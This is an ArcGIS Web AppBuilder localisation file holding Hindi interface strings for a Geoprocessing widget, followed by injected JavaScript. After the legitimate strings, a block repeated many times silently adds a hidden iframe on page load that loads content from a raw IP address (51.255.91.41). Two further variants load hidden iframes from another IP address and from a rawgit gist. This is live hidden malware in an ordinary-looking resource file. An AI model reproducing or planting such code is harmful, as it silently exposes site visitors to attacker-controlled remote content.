// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Geoprocessing/nls/strings":{_widgetLabel:"Geoprocessing",_featureAction_ReceiveFeatureSet:"\u0907\u0938\u0915\u0947 \u0907\u0928\u092a\u0941\u091f \u0915\u0947 \u0930\u0942\u092a \u092e\u0947\u0902 \u0928\u093f\u0930\u094d\u0927\u093e\u0930\u093f\u0924 \u0915\u0930\u0947\u0902 ",requiredInfo:"\u0906\u0935\u0936\u094d\u092f\u0915 \u0939\u0948\u0964",drawnOnMap:"\u092a\u0930\u093f\u0923\u093e\u092e \u0915\u094b \u092e\u093e\u0928\u091a\u093f\u0924\u094d\u0930 \u092a\u0930 \u092c\u0928\u093e\u090f\u0902\u0964",
noToolConfig:"\u092a\u0939\u0932\u0947 \u0938\u0947 \u0915\u0949\u0928\u094d\u095e\u093f\u0917\u0930 \u0915\u094b\u0908 \u092d\u0940 geoprocessing \u0915\u093e\u0930\u094d\u092f \u0909\u092a\u0932\u092c\u094d\u0927 \u0928\u0939\u0940\u0902 \u0939\u0948\u0964",useUrlForGPInput:"URL",useUploadForGPInput:"\u095e\u093e\u0907\u0932 \u0905\u092a\u0932\u094b\u0921 \u0915\u0930\u0947\u0902",selectFileToUpload:"\u092b\u093c\u093e\u0907\u0932 \u0915\u093e \u091a\u092f\u0928 \u0915\u0930\u0947\u0902...",rasterFormat:"\u0930\u093e\u0938\u094d\u091f\u0930 \u0921\u0947\u091f\u093e \u092b\u0949\u0930\u094d\u092e\u0947\u091f",
noFileSelected:"\u0915\u093f\u0938\u0940 \u092d\u0940 \u092b\u093e\u0907\u0932 \u0915\u093e \u091a\u092f\u0928 \u0928\u0939\u0940\u0902 \u0915\u093f\u092f\u093e \u0917\u092f\u093e \u0939\u0948!",uploadSuccess:"\u092b\u093c\u093e\u0907\u0932 \u0938\u092b\u0932\u0924\u093e\u092a\u0942\u0930\u094d\u0935\u0915 \u0905\u092a\u0932\u094b\u0921 \u0939\u094b \u0917\u0908 \u0939\u0948!",showLayerContent:"\u0932\u0947\u092f\u0930 \u0938\u093e\u092e\u0917\u094d\u0930\u0940 \u0926\u093f\u0916\u093e\u090f\u0902",
invalidUrl:"\u0905\u092e\u093e\u0928\u094d\u092f \u092b\u0940\u091a\u0930 \u0938\u0947\u0935\u093e URL",urlPlaceholder:"\u092b\u0940\u091a\u0930 \u0938\u0947\u091f URL",addShapefile:"\u0936\u0947\u092a\u092b\u093c\u093e\u0907\u0932 \u091c\u094b\u0921\u093c\u0947",generateShapefileError:"\u0936\u0947\u092a\u092b\u093c\u093e\u0907\u0932 \u0924\u094d\u0930\u0941\u091f\u093f \u0909\u0924\u094d\u092a\u0928\u094d\u0928 \u0939\u0941\u0908 \u0939\u0948, \u0915\u0943\u092a\u092f\u093e \u091c\u093e\u0901\u091a \u0915\u0930\u0947\u0902: ",
cleared:"\u092a\u0930\u093f\u0923\u093e\u092e \u0938\u093e\u095e \u0915\u0930 \u0926\u093f\u090f \u0917\u090f \u0939\u0948\u0902\u0964",enlargeView:"\u0926\u0943\u0936\u094d\u092f \u0915\u094b \u092c\u095c\u093e \u0915\u0930\u0947\u0902",exportOutput:"\u0928\u093f\u0930\u094d\u092f\u093e\u0924 \u0915\u0930\u0947\u0902",emptyResult:"\u092a\u0930\u093f\u0923\u093e\u092e \u0916\u093e\u0932\u0940 \u0939\u0948\u0964",useSelectedFeatureset:"\u092a\u0930\u093f\u0923\u093e\u092e\u0940 \u092b\u0940\u091a\u0930 \u0915\u093e \u092a\u094d\u0930\u092f\u094b\u0917 \u0915\u0930\u0947\u0902\u0964",
closeSelectedFeatureset:"\u0915\u0949\u0928\u094d\u095e\u093f\u0917\u0930 \u0907\u0928\u092a\u0941\u091f \u0913\u092a\u093f\u092f\u0928 \u0915\u094b \u0938\u093e\u092b \u0914\u0930 \u0909\u092a\u092f\u094b\u0917 \u0915\u0930\u0947\u0902\u0964",currentMapExtent:"\u0935\u0930\u094d\u0924\u092e\u093e\u0928 \u092e\u093e\u0928\u091a\u093f\u0924\u094d\u0930 \u0938\u0940\u092e\u093e",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});